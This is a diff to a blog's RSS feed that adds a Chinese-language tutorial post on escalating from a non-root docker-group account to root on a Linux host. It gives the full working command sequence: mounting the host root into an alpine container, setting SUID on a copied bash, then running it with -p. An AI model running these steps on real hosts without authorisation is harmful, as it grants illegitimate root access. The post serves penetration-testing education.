@@ -7,8 +7,43 @@
     <generator>Hugo -- 0.145.0</generator>
     <language>en</language>
     <copyright>Wd0g</copyright>
-    <lastBuildDate>Mon, 17 Mar 2025 04:24:14 +0800</lastBuildDate>
+    <lastBuildDate>Mon, 17 Mar 2025 23:00:17 +0800</lastBuildDate>
     <atom:link href="https://wd0g.github.io/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Linux有docker非root时提权</title>
+      <link>https://wd0g.github.io/code/linux%E6%9C%89docker%E9%9D%9Eroot%E6%97%B6%E6%8F%90%E6%9D%83/</link>
+      <pubDate>Mon, 17 Mar 2025 23:00:17 +0800</pubDate>
+      <guid>https://wd0g.github.io/code/linux%E6%9C%89docker%E9%9D%9Eroot%E6%97%B6%E6%8F%90%E6%9D%83/</guid>
+      <description>&lt;blockquote&gt;
+&lt;p&gt;在linux服务器中经常会遇到当前账户可以操作docker但是非root权限的情况，本文将介绍一种简单快捷的方法拿到宿主机的root权限&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h2 id=&#34;背景&#34;&gt;背景&lt;/h2&gt;
+&lt;p&gt;首先查看当前用户权限是否包含docker,下面这样就是包含docker权限&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;gt; id
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;111&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;113&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;113&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,988&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;docker&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;有时候查看当前权限没有显示docker像下面这样，实际也能操作docker&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;gt; id
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;111&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;113&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;113&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;所以直接执行&lt;strong&gt;docker ps&lt;/strong&gt; 查看是最直接的&lt;/p&gt;
+&lt;h2 id=&#34;suid-bash提权&#34;&gt;SUID bash提权&lt;/h2&gt;
+&lt;h3 id=&#34;什么是suid&#34;&gt;什么是SUID&lt;/h3&gt;
+&lt;p&gt;在 Linux 系统中，SUID（Set User ID） 是一种特殊的文件权限位，用于临时赋予用户执行文件时以文件所有者的身份运行的权限（而不是当前用户的身份）。这种权限通常用于允许普通用户执行某些需要更高权限的操作。&lt;/p&gt;
+&lt;p&gt;说白了就是以非root用户权限执行SUID文件，该文件的实际权限还是root。&lt;/p&gt;
+&lt;p&gt;这时候思路就来了，我们通过映射宿主机中的bash到容器中，再通过容器中的root权限将该bash设置SUID权限，然后将该文件拿到宿主机中执行即可拿到root权限&lt;/p&gt;
+&lt;h3 id=&#34;实践&#34;&gt;实践&lt;/h3&gt;
+&lt;p&gt;首先将宿主机根目录映射到容器中，然后在容器中将宿主机中的bash复制到/tmp目录，然后将该文件赋予SUID权限，最后退出容器在宿主机中执行该文件&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;test&amp;gt; docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;gt; cp /bin/bash /tmp/bash
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;gt; chmod +s /tmp/bash
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;gt; &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# 退出当前chroot的shell&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;gt; &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# 退出当前容器的shell&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;test&amp;gt; /tmp/bash -p &lt;span class=&#34;c1&#34;&gt;# 当前文件已经设置好SUID权限，所以直接执行即可获得root权限&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;gt; whoami
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;root
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;该方法相对&lt;strong&gt;计划任务&lt;/strong&gt;或其他方式提root更简单直接&lt;/p&gt;
+&lt;h2 id=&#34;参考&#34;&gt;参考&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/kqdssheng/p/18275541&#34;&gt;https://www.cnblogs.com/kqdssheng/p/18275541&lt;/a&gt;&lt;/p&gt;</description>
+    </item>
     <item>
       <title>对生活的一点想法</title>
       <link>https://wd0g.github.io/life/%E5%AF%B9%E7%94%9F%E6%B4%BB%E7%9A%84%E4%B8%80%E7%82%B9%E6%83%B3%E6%B3%95/</link>
